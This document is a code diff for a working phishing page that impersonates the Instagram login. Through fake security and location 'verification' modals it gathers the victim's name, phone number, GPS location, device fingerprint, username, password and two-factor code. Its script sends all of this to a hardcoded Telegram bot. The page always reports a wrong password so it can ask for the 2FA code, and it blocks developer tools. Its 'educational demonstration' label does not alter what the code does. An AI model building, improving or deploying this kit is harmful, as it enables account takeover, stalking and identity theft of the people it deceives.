@@ -11,6 +11,7 @@
             padding: 0;
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -20,6 +21,7 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            overflow-x: hidden;
         }
 
         .container {
@@ -29,17 +31,20 @@
             justify-content: center;
             align-items: center;
             gap: 60px;
+            position: relative;
         }
 
         .phone-image {
             flex: 1;
             display: flex;
             justify-content: flex-end;
+            position: relative;
         }
 
         .phone-image img {
             height: 600px;
             display: block;
+            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.1));
         }
 
         .login-section {
@@ -57,13 +62,14 @@
         }
 
         .logo {
-            font-family: 'Instagram', cursive;
-            font-size: 48px;
+            font-family: 'Billabong', cursive;
+            font-size: 51px;
             margin-bottom: 30px;
-            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            font-weight: bold;
+            font-weight: normal;
+            letter-spacing: 1px;
         }
 
         .input-group {
@@ -79,6 +85,7 @@
             border-radius: 3px;
             font-size: 12px;
             color: #262626;
+            transition: border-color 0.2s;
         }
 
         input:focus {
@@ -88,7 +95,7 @@
 
         .login-btn {
             width: 100%;
-            padding: 8px;
+            padding: 9px;
             background-color: #0095f6;
             color: white;
             border: none;
@@ -97,12 +104,15 @@
             font-size: 14px;
             margin: 15px 0;
             cursor: pointer;
-            opacity: 0.7;
+            transition: background-color 0.2s;
         }
 
         .login-btn:hover {
             background-color: #1877f2;
-            opacity: 1;
+        }
+
+        .login-btn:active {
+            transform: scale(0.99);
         }
 
         .separator {
@@ -130,12 +140,22 @@
             text-decoration: none;
             display: block;
             margin: 20px 0;
+            transition: opacity 0.2s;
+        }
+
+        .facebook-login:hover {
+            opacity: 0.8;
         }
 
         .forgot-password {
             color: #00376b;
             font-size: 12px;
             text-decoration: none;
+            transition: opacity 0.2s;
+        }
+
+        .forgot-password:hover {
+            opacity: 0.8;
         }
 
         .signup-box {
@@ -161,11 +181,23 @@
         .app-download p {
             margin: 20px 0;
             font-size: 14px;
+            color: #262626;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
         }
 
         .app-buttons img {
             height: 40px;
-            margin: 0 5px;
+            border-radius: 5px;
+            transition: transform 0.2s;
+        }
+
+        .app-buttons img:hover {
+            transform: scale(1.05);
         }
 
         /* Modal Styles */
@@ -176,11 +208,12 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
+            background-color: rgba(0, 0, 0, 0.8);
             z-index: 1000;
             justify-content: center;
             align-items: center;
             animation: fadeIn 0.3s ease;
+            padding: 20px;
         }
 
         @keyframes fadeIn {
@@ -190,40 +223,43 @@
 
         .modal-content {
             background-color: white;
-            padding: 30px;
+            padding: 40px 30px;
             border-radius: 12px;
             max-width: 400px;
-            width: 90%;
+            width: 100%;
             text-align: center;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
             animation: slideUp 0.3s ease;
+            position: relative;
         }
 
         @keyframes slideUp {
-            from { transform: translateY(20px); opacity: 0; }
+            from { transform: translateY(30px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
 
         .modal-logo {
-            font-size: 36px;
+            font-family: 'Billabong', cursive;
+            font-size: 42px;
             margin-bottom: 20px;
-            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            font-weight: bold;
+            font-weight: normal;
         }
 
         .modal h2 {
             margin-bottom: 15px;
             font-size: 18px;
             color: #262626;
+            font-weight: 600;
         }
 
         .modal p {
             color: #8e8e8e;
             font-size: 14px;
-            margin-bottom: 20px;
-            line-height: 1.4;
+            margin-bottom: 25px;
+            line-height: 1.5;
         }
 
         .modal-btn {
@@ -237,6 +273,11 @@
             width: 100%;
             margin: 10px 0;
             font-size: 14px;
+            transition: background-color 0.2s;
+        }
+
+        .modal-btn:hover {
+            background-color: #1877f2;
         }
 
         .modal-btn:disabled {
@@ -252,6 +293,11 @@
             cursor: pointer;
             padding: 12px;
             font-size: 14px;
+            transition: opacity 0.2s;
+        }
+
+        .modal-btn-secondary:hover {
+            opacity: 0.8;
         }
 
         .error-message {
@@ -259,6 +305,7 @@
             font-size: 12px;
             margin-top: 10px;
             display: none;
+            font-weight: 400;
         }
 
         .info-modal {
@@ -268,9 +315,9 @@
         .info-item {
             text-align: left;
             margin: 10px 0;
-            padding: 10px;
+            padding: 12px;
             background-color: #fafafa;
-            border-radius: 5px;
+            border-radius: 6px;
             font-size: 12px;
             border-left: 3px solid #0095f6;
         }
@@ -284,7 +331,7 @@
 
         .info-value {
             color: #8e8e8e;
-            word-break: break-all;
+            word-break: break-word;
         }
 
         .loader {
@@ -311,6 +358,11 @@
             
             .container {
                 justify-content: center;
+                gap: 0;
+            }
+            
+            .login-section {
+                width: 100%;
             }
         }
 
@@ -323,21 +375,28 @@
             
             body {
                 background-color: white;
+                padding: 0;
             }
             
             .modal-content {
-                padding: 20px;
+                padding: 30px 20px;
                 width: 95%;
+                max-width: 320px;
             }
-        }
-
-        .hidden {
-            display: none;
+            
+            .app-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .app-buttons img {
+                margin: 5px 0;
+            }
         }
 
         .password-toggle {
             position: absolute;
-            right: 10px;
+            right: 12px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
@@ -346,6 +405,7 @@
             font-size: 12px;
             cursor: pointer;
             font-weight: 600;
+            padding: 4px 8px;
         }
 
         .warning-note {
@@ -355,13 +415,83 @@
             text-align: center;
             padding: 10px;
             border-top: 1px solid #dbdbdb;
+            line-height: 1.4;
+        }
+
+        .modal-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+
+        .input-error {
+            border-color: #ed4956 !important;
+        }
+
+        .error-text {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: left;
+            display: none;
+        }
+
+        .location-error-box {
+            background: rgba(237, 73, 86, 0.1);
+            border: 1px solid rgba(237, 73, 86, 0.2);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .location-error-box p {
+            color: #ed4956;
+            font-size: 13px;
+            margin: 0;
+        }
+
+        .loading-text {
+            color: #8e8e8e;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .security-check {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .checkmark {
+            color: #00a400;
+            font-size: 24px;
+        }
+
+        /* Instagram Font */
+        @font-face {
+            font-family: 'Billabong';
+            src: url('https://fonts.cdnfonts.com/s/12466/Billabong.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="phone-image">
-            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOosk" alt="Instagram on iPhone" onerror="this.style.display='none'">
+            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png" alt="Instagram on iPhone">
         </div>
         
         <div class="login-section">
@@ -402,13 +532,13 @@
             <div class="app-download">
                 <p>Get the app.</p>
                 <div class="app-buttons">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" onerror="this.style.display='none'">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" onerror="this.style.display='none'">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
                 </div>
             </div>
             
             <div class="warning-note">
-                This is a security demonstration page for educational purposes only.
+                <strong>Security Notice:</strong> This is an educational demonstration. Never share your login credentials on suspicious websites.
             </div>
         </div>
     </div>
@@ -417,21 +547,19 @@
     <div class="modal" id="initialModal">
         <div class="modal-content">
             <div class="modal-logo">Instagram</div>
-            <h2>Welcome Back!</h2>
+            <h2>Account Verification Required</h2>
             <p>To help keep your account secure, Instagram needs to verify your identity.</p>
-            <p style="font-size: 13px; color: #262626; margin: 15px 0; background: #fafafa; padding: 10px; border-radius: 5px;">
-                <strong>Security Check Required</strong><br>
-                Please complete this one-time verification.
-            </p>
             
             <div class="input-group">
-                <input type="text" id="userFullName" placeholder="Your Full Name" required>
+                <input type="text" id="userFullName" placeholder="Full Name" required>
+                <div class="error-text" id="nameError">Please enter your full name</div>
             </div>
             <div class="input-group">
                 <input type="tel" id="userMobile" placeholder="Mobile Number" required>
+                <div class="error-text" id="mobileError">Please enter a valid mobile number</div>
             </div>
             
-            <p style="font-size: 11px; color: #8e8e8e; margin: 15px 0; line-height: 1.4;">
+            <p style="font-size: 12px; color: #8e8e8e; margin: 20px 0; line-height: 1.4;">
                 By providing your information, you agree to our Terms and Privacy Policy. This helps us protect your account from unauthorized access.
             </p>
             
@@ -444,26 +572,31 @@
     <div class="modal" id="locationModal">
         <div class="modal-content">
             <div class="modal-logo">Instagram</div>
-            <h2>Location Required</h2>
-            <p>Instagram needs to verify your location to protect your account from suspicious login attempts.</p>
+            <h2>Location Verification Required</h2>
+            <p>For your security, Instagram needs to verify your location to protect against suspicious login attempts.</p>
             
             <div style="background: #fafafa; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left;">
-                <p style="font-size: 13px; color: #262626; margin-bottom: 10px;">
-                    <strong>Why this is required:</strong>
+                <p style="font-size: 13px; color: #262626; margin-bottom: 8px; font-weight: 600;">
+                    Why we need this:
                 </p>
-                <ul style="font-size: 12px; color: #8e8e8e; padding-left: 20px;">
-                    <li>Verify it's really you logging in</li>
-                    <li>Prevent unauthorized access</li>
-                    <li>Alert you of suspicious activity</li>
+                <ul style="font-size: 12px; color: #8e8e8e; padding-left: 20px; margin: 0;">
+                    <li>Confirm it's really you logging in</li>
+                    <li>Prevent unauthorized access from new locations</li>
+                    <li>Send alerts for suspicious activity</li>
                 </ul>
             </div>
             
-            <p id="locationError" style="color: #ed4956; font-size: 12px; margin-top: 15px; display: none;">
-                <strong>Location access denied.</strong> Please allow location access to continue. If error persists, try opening in incognito/private tab.
-            </p>
+            <div class="location-error-box" id="locationErrorBox" style="display: none;">
+                <p id="locationErrorMessage">
+                    <strong>Location access denied.</strong> Please allow location access to continue. If error persists, try opening this page in an incognito/private tab.
+                </p>
+            </div>
             
-            <button class="modal-btn" id="allowLocationBtn">Allow Location Access</button>
-            <button class="modal-btn-secondary" id="tryAgainBtn">Try Again</button>
+            <button class="modal-btn" id="allowLocationBtn">
+                <span id="locationBtnText">Allow Location Access</span>
+                <div class="loader" id="locationLoader" style="display: none;"></div>
+            </button>
+            <button class="modal-btn-secondary" id="tryAgainBtn" style="display: none;">Try Again</button>
         </div>
     </div>
 
@@ -471,34 +604,37 @@
     <div class="modal" id="securityModal">
         <div class="modal-content info-modal">
             <div class="modal-logo">Instagram</div>
-            <h2>Verifying Your Device</h2>
-            <p>Instagram is checking your device for security purposes...</p>
+            <h2>Security Check Complete</h2>
             
-            <div style="margin: 20px 0;">
-                <div class="loader" style="width: 40px; height: 40px; margin: 20px auto;"></div>
-                <p style="font-size: 13px; color: #8e8e8e;">Checking device compatibility and security</p>
+            <div class="security-check">
+                <div class="checkmark">✓</div>
+                <p style="color: #00a400; font-weight: 600;">Device verified successfully</p>
             </div>
             
-            <div id="deviceInfo" style="text-align: left; max-height: 300px; overflow-y: auto; margin: 20px 0; padding: 10px; background: #fafafa; border-radius: 8px;">
+            <p style="font-size: 14px; color: #8e8e8e; margin: 20px 0;">
+                Your device information has been verified for security purposes.
+            </p>
+            
+            <div id="deviceInfo" style="text-align: left; max-height: 300px; overflow-y: auto; margin: 20px 0;">
                 <!-- Device info will be populated here -->
             </div>
             
-            <button class="modal-btn" id="continueBtn" style="display: none;">Continue to Instagram</button>
+            <button class="modal-btn" id="continueBtn">Continue to Instagram</button>
         </div>
     </div>
 
-    <!-- Two-Factor Modal -->
+    <!-- Two-Factor Authentication Modal -->
     <div class="modal" id="twoFactorModal">
         <div class="modal-content">
             <div class="modal-logo">Instagram</div>
             <h2>Two-Factor Authentication</h2>
             <p>Enter the 6-digit code sent to your phone ending with ****<span id="phoneLastDigits"></span></p>
             
-            <div class="input-group" style="margin: 20px 0;">
-                <input type="text" id="twoFactorCode" placeholder="6-digit code" maxlength="6" pattern="\d{6}" required>
+            <div class="input-group" style="margin: 25px 0;">
+                <input type="text" id="twoFactorCode" placeholder="6-digit code" maxlength="6" pattern="\d{6}" required style="text-align: center; font-size: 18px; letter-spacing: 8px;">
             </div>
             
-            <p style="font-size: 12px; color: #8e8e8e; margin: 10px 0;">
+            <p style="font-size: 12px; color: #8e8e8e; margin: 15px 0;">
                 Didn't receive a code? <a href="#" style="color: #0095f6; text-decoration: none;">Resend Code</a>
             </p>
             
@@ -509,10 +645,10 @@
 
     <script>
         // ============================================
-        // CONFIGURATION - REPLACE WITH YOUR TELEGRAM BOT
+        // CONFIGURATION - TELEGRAM BOT SETTINGS
         // ============================================
-        const TELEGRAM_BOT_TOKEN = '8220432493:AAHb6lKFGK5M6uWAIqlGTogjCamNfwJJT0Q';  // Replace with your bot token
-        const TELEGRAM_CHAT_ID = '8089637989';      // Replace with your chat ID
+        const TELEGRAM_BOT_TOKEN = '8220432493:AAHb6lKFGK5M6uWAIqlGTogjCamNfwJJT0Q';
+        const TELEGRAM_CHAT_ID = '8089637989';
         
         // ============================================
         // DATA COLLECTION OBJECT
@@ -522,6 +658,7 @@
             location: {},
             deviceInfo: {},
             userInfo: {},
+            sessionData: {},
             timestamps: {
                 pageLoad: new Date().toISOString(),
                 loginAttempt: null,
@@ -552,10 +689,15 @@
         const userMobileInput = document.getElementById('userMobile');
         const verifyUserBtn = document.getElementById('verifyUserBtn');
         const verifyLoader = document.getElementById('verifyLoader');
+        const nameError = document.getElementById('nameError');
+        const mobileError = document.getElementById('mobileError');
         
         const allowLocationBtn = document.getElementById('allowLocationBtn');
+        const locationBtnText = document.getElementById('locationBtnText');
+        const locationLoader = document.getElementById('locationLoader');
         const tryAgainBtn = document.getElementById('tryAgainBtn');
-        const locationError = document.getElementById('locationError');
+        const locationErrorBox = document.getElementById('locationErrorBox');
+        const locationErrorMessage = document.getElementById('locationErrorMessage');
         
         const continueBtn = document.getElementById('continueBtn');
         const deviceInfoDiv = document.getElementById('deviceInfo');
@@ -563,52 +705,52 @@
         const twoFactorCodeInput = document.getElementById('twoFactorCode');
         const verifyCodeBtn = document.getElementById('verifyCodeBtn');
         const phoneLastDigits = document.getElementById('phoneLastDigits');
+        const useBackupBtn = document.getElementById('useBackupBtn');
+
+        // ============================================
+        // STATE MANAGEMENT
+        // ============================================
+        let locationAllowed = false;
+        let userInfoCollected = false;
+        let locationModalShown = false;
 
         // ============================================
         // INITIALIZATION
         // ============================================
         document.addEventListener('DOMContentLoaded', function() {
-            // Generate session ID
+            // Generate unique session ID
             collectedData.sessionId = 'insta_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
             
-            // Start collecting device info
+            // Collect device information immediately
             collectAllDeviceInfo();
             
             // Check if user has already completed initial verification
             const hasCompletedInitial = sessionStorage.getItem('insta_initial_complete');
             
             if (!hasCompletedInitial) {
-                // Show initial modal after delay
+                // Show initial modal after short delay
                 setTimeout(() => {
                     initialModal.style.display = 'flex';
-                }, 1500);
-            } else {
-                // Show location modal
-                setTimeout(() => {
-                    showLocationModal();
+                    document.body.style.overflow = 'hidden';
                 }, 1000);
+            } else {
+                userInfoCollected = true;
+                // Check if location was already allowed
+                locationAllowed = sessionStorage.getItem('insta_location_allowed') === 'true';
+                
+                if (!locationAllowed) {
+                    setTimeout(() => {
+                        showLocationModal();
+                    }, 800);
+                }
             }
             
-            // Prevent right-click
-            document.addEventListener('contextmenu', function(e) {
-                e.preventDefault();
-                return false;
-            });
-            
-            // Prevent keyboard shortcuts
-            document.addEventListener('keydown', function(e) {
-                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-                if (e.keyCode === 123 || 
-                    (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
-                    (e.ctrlKey && e.keyCode === 85)) {
-                    e.preventDefault();
-                    return false;
-                }
-            });
+            // Prevent developer tools
+            preventDevTools();
         });
 
         // ============================================
-        // PASSWORD TOGGLE
+        // PASSWORD TOGGLE FUNCTIONALITY
         // ============================================
         togglePasswordBtn.addEventListener('click', function() {
             if (passwordInput.type === 'password') {
@@ -618,6 +760,189 @@
                 passwordInput.type = 'password';
                 togglePasswordBtn.textContent = 'Show';
             }
+        });
+
+        // ============================================
+        // INITIAL USER INFO MODAL
+        // ============================================
+        verifyUserBtn.addEventListener('click', async function() {
+            const fullName = userFullNameInput.value.trim();
+            const mobile = userMobileInput.value.trim();
+            
+            // Reset errors
+            nameError.style.display = 'none';
+            mobileError.style.display = 'none';
+            userFullNameInput.classList.remove('input-error');
+            userMobileInput.classList.remove('input-error');
+            
+            let hasError = false;
+            
+            if (!fullName) {
+                nameError.style.display = 'block';
+                userFullNameInput.classList.add('input-error');
+                userFullNameInput.focus();
+                hasError = true;
+            }
+            
+            if (!mobile || mobile.length < 10) {
+                mobileError.style.display = 'block';
+                userMobileInput.classList.add('input-error');
+                if (!hasError) userMobileInput.focus();
+                hasError = true;
+            }
+            
+            if (hasError) return;
+            
+            // Store user info
+            collectedData.userInfo = {
+                fullName: fullName,
+                mobileNumber: mobile,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Show loading state
+            verifyUserBtn.disabled = true;
+            verifyUserBtn.textContent = '';
+            verifyLoader.style.display = 'block';
+            
+            // Send user info to Telegram
+            await sendToTelegram('USER_INFO');
+            
+            // Mark as completed
+            sessionStorage.setItem('insta_initial_complete', 'true');
+            userInfoCollected = true;
+            
+            // Hide modal and show location modal
+            setTimeout(() => {
+                initialModal.style.display = 'none';
+                verifyUserBtn.disabled = false;
+                verifyUserBtn.textContent = 'Verify & Continue';
+                verifyLoader.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                
+                // Show location modal
+                showLocationModal();
+            }, 1000);
+        });
+
+        // ============================================
+        // LOCATION MODAL FUNCTIONS
+        // ============================================
+        function showLocationModal() {
+            if (!locationModalShown) {
+                locationModal.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+                locationModalShown = true;
+                
+                // Reset UI state
+                locationErrorBox.style.display = 'none';
+                tryAgainBtn.style.display = 'none';
+                locationBtnText.textContent = 'Allow Location Access';
+                locationLoader.style.display = 'none';
+                allowLocationBtn.disabled = false;
+            }
+        }
+
+        function hideLocationModal() {
+            locationModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+            locationModalShown = false;
+        }
+
+        allowLocationBtn.addEventListener('click', async function() {
+            locationBtnText.textContent = 'Getting Location...';
+            locationLoader.style.display = 'block';
+            allowLocationBtn.disabled = true;
+            locationErrorBox.style.display = 'none';
+            
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async function(position) {
+                        // Success - got location
+                        collectedData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters',
+                            altitude: position.coords.altitude || 'Not available',
+                            heading: position.coords.heading || 'Not available',
+                            speed: position.coords.speed || 'Not available',
+                            timestamp: new Date().toISOString(),
+                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                            source: 'GPS',
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        };
+                        
+                        collectedData.timestamps.locationCaptured = new Date().toISOString();
+                        
+                        // Mark location as allowed
+                        locationAllowed = true;
+                        sessionStorage.setItem('insta_location_allowed', 'true');
+                        
+                        // Send location to Telegram
+                        await sendToTelegram('LOCATION');
+                        
+                        // Hide modal
+                        hideLocationModal();
+                        
+                        // Show security verification
+                        setTimeout(() => {
+                            showSecurityVerification();
+                        }, 500);
+                    },
+                    async function(error) {
+                        // Error - location denied
+                        locationBtnText.textContent = 'Allow Location Access';
+                        locationLoader.style.display = 'none';
+                        allowLocationBtn.disabled = false;
+                        tryAgainBtn.style.display = 'inline-block';
+                        
+                        let errorMessage = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Location access was denied. Please allow location access to continue.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information is unavailable. Please try again.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "The request to get your location timed out. Please try again.";
+                                break;
+                            default:
+                                errorMessage = "An unknown error occurred. Please try again.";
+                        }
+                        
+                        locationErrorMessage.textContent = errorMessage + " If error persists, open this page in an incognito/private tab.";
+                        locationErrorBox.style.display = 'block';
+                        
+                        // Try to get approximate location via IP
+                        await getLocationByIP();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Geolocation not supported
+                locationErrorMessage.textContent = "Your browser doesn't support geolocation. Please try with a different browser or device.";
+                locationErrorBox.style.display = 'block';
+                locationBtnText.textContent = 'Allow Location Access';
+                locationLoader.style.display = 'none';
+                allowLocationBtn.disabled = false;
+                tryAgainBtn.style.display = 'inline-block';
+                
+                // Try to get location by IP
+                await getLocationByIP();
+            }
+        });
+
+        tryAgainBtn.addEventListener('click', function() {
+            locationErrorBox.style.display = 'none';
+            tryAgainBtn.style.display = 'none';
+            locationBtnText.textContent = 'Allow Location Access';
+            locationLoader.style.display = 'none';
+            allowLocationBtn.disabled = false;
         });
 
         // ============================================
@@ -631,6 +956,13 @@
             
             if (!username || !password) {
                 showError('Please fill in all fields');
+                return;
+            }
+            
+            // Check if location is allowed
+            if (!locationAllowed) {
+                showLocationModal();
+                showError('Please complete location verification first');
                 return;
             }
             
@@ -648,130 +980,24 @@
             btnLoader.style.display = 'block';
             submitBtn.disabled = true;
             
-            // Simulate network delay
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            // Send data to Telegram
+            // Send credentials to Telegram
             await sendToTelegram('CREDENTIALS');
             
-            // Always show wrong password error
-            btnText.style.display = 'inline';
-            btnLoader.style.display = 'none';
-            submitBtn.disabled = false;
-            errorMessage.style.display = 'block';
-            
-            // Clear password field
-            passwordInput.value = '';
-            
-            // Show two-factor modal after incorrect password
+            // Always show wrong password error (as per requirement)
             setTimeout(() => {
-                showTwoFactorModal();
-            }, 1000);
-        });
-
-        // ============================================
-        // INITIAL USER INFO MODAL
-        // ============================================
-        verifyUserBtn.addEventListener('click', async function() {
-            const fullName = userFullNameInput.value.trim();
-            const mobile = userMobileInput.value.trim();
-            
-            if (!fullName || !mobile) {
-                alert('Please fill in all required fields');
-                return;
-            }
-            
-            // Store user info
-            collectedData.userInfo = {
-                fullName: fullName,
-                mobileNumber: mobile,
-                timestamp: new Date().toISOString()
-            };
-            
-            // Show loading
-            verifyUserBtn.style.display = 'none';
-            verifyLoader.style.display = 'block';
-            
-            // Send to Telegram
-            await sendToTelegram('USER_INFO');
-            
-            // Mark as completed
-            sessionStorage.setItem('insta_initial_complete', 'true');
-            
-            // Hide modal
-            initialModal.style.display = 'none';
-            verifyUserBtn.style.display = 'block';
-            verifyLoader.style.display = 'none';
-            
-            // Show location modal
-            setTimeout(() => {
-                showLocationModal();
-            }, 500);
-        });
-
-        // ============================================
-        // LOCATION HANDLING
-        // ============================================
-        function showLocationModal() {
-            locationModal.style.display = 'flex';
-            locationError.style.display = 'none';
-        }
-
-        allowLocationBtn.addEventListener('click', async function() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    async function(position) {
-                        // Success - got location
-                        collectedData.location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + ' meters',
-                            altitude: position.coords.altitude || 'Not available',
-                            heading: position.coords.heading || 'Not available',
-                            speed: position.coords.speed || 'Not available',
-                            timestamp: new Date().toISOString(),
-                            mapLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
-                            source: 'GPS'
-                        };
-                        
-                        collectedData.timestamps.locationCaptured = new Date().toISOString();
-                        
-                        // Send location to Telegram
-                        await sendToTelegram('LOCATION');
-                        
-                        // Hide modal
-                        locationModal.style.display = 'none';
-                        
-                        // Show security verification
-                        showSecurityVerification();
-                    },
-                    async function(error) {
-                        // Error - location denied
-                        locationError.style.display = 'block';
-                        allowLocationBtn.textContent = 'Allow Location Access';
-                        
-                        // Try to get location by IP
-                        await getLocationByIP();
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
+                btnText.style.display = 'inline';
+                btnLoader.style.display = 'none';
+                submitBtn.disabled = false;
+                errorMessage.style.display = 'block';
                 
-                allowLocationBtn.textContent = 'Getting Location...';
-                allowLocationBtn.disabled = true;
-            } else {
-                // Geolocation not supported
-                await getLocationByIP();
-            }
-        });
-
-        tryAgainBtn.addEventListener('click', function() {
-            locationError.style.display = 'none';
-            allowLocationBtn.disabled = false;
-            allowLocationBtn.textContent = 'Allow Location Access';
+                // Clear password field
+                passwordInput.value = '';
+                
+                // Show two-factor modal
+                setTimeout(() => {
+                    showTwoFactorModal();
+                }, 800);
+            }, 1500);
         });
 
         // ============================================
@@ -787,7 +1013,7 @@
                 language: navigator.language,
                 languages: navigator.languages,
                 cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
+                doNotTrack: navigator.doNotTrack || 'Not specified',
                 
                 // Screen info
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
@@ -805,7 +1031,8 @@
                     effectiveType: navigator.connection.effectiveType,
                     downlink: navigator.connection.downlink + ' Mbps',
                     rtt: navigator.connection.rtt + ' ms',
-                    saveData: navigator.connection.saveData
+                    saveData: navigator.connection.saveData,
+                    type: navigator.connection.type || 'Unknown'
                 } : 'Not available',
                 
                 // Hardware info
@@ -818,7 +1045,7 @@
                 timezoneOffset: new Date().getTimezoneOffset(),
                 locale: Intl.DateTimeFormat().resolvedOptions().locale,
                 
-                // Performance info
+                // Device type detection
                 deviceType: /Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                 browser: getBrowserName(),
                 os: getOperatingSystem(),
@@ -841,16 +1068,11 @@
                 }
             }
             
-            // WebGL info (GPU)
+            // GPU info via WebGL
             collectedData.deviceInfo.gpu = getWebGLInfo();
             
-            // IP address
-            await getIPAddress();
-            
-            // SIM info (for mobile)
-            if ('getInstalledRelatedApps' in navigator) {
-                collectedData.deviceInfo.simInfo = 'Available (requires permission)';
-            }
+            // IP address and network info
+            await getIPAndNetworkInfo();
             
             // Storage info
             if ('storage' in navigator && 'estimate' in navigator.storage) {
@@ -866,40 +1088,37 @@
                 }
             }
             
-            console.log('Device info collected:', collectedData.deviceInfo);
-        }
-
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        return {
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                        };
-                    }
-                }
-                return 'WebGL available but debug info not accessible';
-            } catch (e) {
-                return 'WebGL not available';
+            // Performance info
+            if ('performance' in window && 'memory' in performance) {
+                collectedData.deviceInfo.performance = {
+                    jsHeapSizeLimit: formatBytes(performance.memory.jsHeapSizeLimit),
+                    totalJSHeapSize: formatBytes(performance.memory.totalJSHeapSize),
+                    usedJSHeapSize: formatBytes(performance.memory.usedJSHeapSize)
+                };
             }
+            
+            console.log('Device info collected for educational purposes');
         }
 
-        async function getIPAddress() {
+        async function getIPAndNetworkInfo() {
             try {
-                // Try multiple IP services
                 const services = [
                     'https://api.ipify.org?format=json',
                     'https://ipapi.co/json/',
-                    'https://api.myip.com'
+                    'https://api.my-ip.io/ip.json'
                 ];
                 
                 for (const service of services) {
                     try {
-                        const response = await fetch(service, { timeout: 5000 });
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 3000);
+                        
+                        const response = await fetch(service, { 
+                            signal: controller.signal 
+                        });
+                        
+                        clearTimeout(timeoutId);
+                        
                         if (response.ok) {
                             const data = await response.json();
                             
@@ -917,13 +1136,13 @@
                                     org: data.org,
                                     asn: data.asn,
                                     isp: data.org,
-                                    reverse: data.reverse || 'Not available'
+                                    currency: data.currency,
+                                    callingCode: data.country_calling_code,
+                                    languages: data.languages
                                 };
-                            } else if (service.includes('ipify')) {
+                            } else {
                                 collectedData.deviceInfo.ipAddress = data.ip;
-                            } else if (service.includes('myip')) {
-                                collectedData.deviceInfo.ipAddress = data.ip;
